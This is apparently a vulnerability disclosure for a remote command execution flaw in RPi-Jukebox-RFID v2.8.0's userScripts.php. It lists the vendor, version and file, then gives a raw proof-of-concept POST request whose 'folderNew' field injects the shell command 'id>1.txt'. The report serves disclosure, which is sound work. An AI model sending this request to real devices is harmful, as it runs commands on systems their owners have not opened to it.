# RCE vulnerability in [RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID) v2.8.0 of file /userScripts.php

**vender**:

- [MiczFlor/RPi-Jukebox-RFID: A Raspberry Pi jukebox, playing local music, podcasts, web radio and streams triggered by RFID cards, web app or home automation. All plug and play via USB. GPIO scripts available.](https://github.com/MiczFlor/RPi-Jukebox-RFID)

**SoftLink**:

- [Release v2.8.0: Fix Spotify Authentication · MiczFlor/RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID/releases/tag/v2.8.0)

**Vulnerable File**

- /htdocs/userScripts.php

**Version**

- 2.8.0

### POC

```
POST /userScripts.php HTTP/1.1
Host: 192.168.129.130
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----geckoformboundary954485b962794cdd4e4e3867c23d1870
Origin: http://192.168.129.130
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Referer: http://192.168.129.130/userScripts.php
Content-Length: 752

------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="folder"

false
------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="filename"


------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="ACTION"

userScript
------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="folder"

false
------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="folderNew"

1;id>1.txt;
------geckoformboundary954485b962794cdd4e4e3867c23d1870
Content-Disposition: form-data; name="submit"

trackMove
------geckoformboundary954485b962794cdd4e4e3867c23d1870--

```

![image-20250828223843999](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282238151.png)



![image-20250828223748883](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282237029.png)

![image-20250828223903297](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282239341.png)
